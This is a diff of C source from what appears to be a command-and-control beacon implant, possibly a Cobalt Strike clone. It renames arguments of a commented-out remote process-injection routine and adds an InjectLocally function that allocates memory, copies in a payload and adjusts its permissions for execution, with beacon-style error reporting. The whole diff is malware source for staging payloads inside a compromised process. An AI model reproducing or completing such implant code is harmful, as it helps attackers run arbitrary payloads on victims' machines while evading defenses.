@@ -148,19 +148,46 @@ typedef struct _PAYLOAD
 	DWORD smartInjectMagic;
 } PAYLOAD;
 
-#define REFLECTIVE_LOADER_SIZE 51200
 
 
-char* InjectRemotely(INJECTION* injection, const char* str, int aLen)
+
+char* InjectRemotely(INJECTION* injection, const char* payload, int size)
 {
 	/*if (S_PROCINJ_ALLOCATOR && injection->isX86NativeOrEmulated)
 	{
-		return InjectViaNtMapViewOfSection(injection->process, injection->pid, str, aLen);
+		return InjectViaNtMapViewOfSection(injection->process, injection->pid, payload, size);
 	}
 	else
 	{
-		return InjectViaVirtualAllocEx(injection->process, injection->pid, str, aLen);
+		return InjectViaVirtualAllocEx(injection->process, injection->pid, payload, size);
 	}*/
+	return NULL;
+}
+
+char* InjectLocally(char* payload, int size)
+{
+	int dwSize = S_PROCINJ_MINALLOC;
+	if (size > dwSize)
+		dwSize = size + 1024;
+
+	char* pAlloc = (char*)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, S_PROCINJ_PERMS_I);
+
+	if (!pAlloc)
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not allocate %d bytes in process: %s", dwSize, LAST_ERROR_STR(lastError));
+		BeaconErrorDD(ERROR_LOCAL_ALLOC_FAILED, dwSize, lastError);
+		return NULL;
+	}
+
+	memcpy(pAlloc, payload, size);
+	if (AdjustMemoryPermissions(pAlloc,dwSize))
+	{
+		return pAlloc;
+	}
+
+	VirtualFree(pAlloc, 0, MEM_RELEASE);
+
 	return NULL;
 }
 
@@ -170,6 +197,7 @@ void InjectAndExecute(INJECTION* injection, char* payload, int pLen, int pOffset
 	return;
 }
 
+#define REFLECTIVE_LOADER_SIZE 51200
 void BeaconInjectProcessInternal(PROCESS_INFORMATION* processInfo, HANDLE hProcess, int pid, char* payload, int pLen,
                                  int pOffset, char* str, int aLen)
 {
